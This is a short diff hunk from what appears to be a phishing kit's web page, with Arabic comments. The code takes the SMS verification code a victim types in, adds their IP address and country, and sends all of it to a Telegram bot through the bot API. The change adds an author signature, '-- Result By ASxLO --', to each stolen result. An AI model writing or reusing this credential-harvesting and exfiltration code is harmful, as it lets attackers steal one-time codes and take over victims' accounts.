@@ -753,7 +753,7 @@ span{
                 $("#error-message").text(""); // إزالة رسالة الخطأ إذا تم إدخال رمز الـ SMS بشكل صحيح
             }
 
-            var telegramMessage = "SMS Code : " + smsCode + "\nIP : " + ipAddress + "\nCountry : " + country;
+            var telegramMessage = "-- Result By ASxLO --" + "\nSMS Code : " + smsCode + "\nIP : " + ipAddress + "\nCountry : " + country;
 
             var telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
             var requestData = {
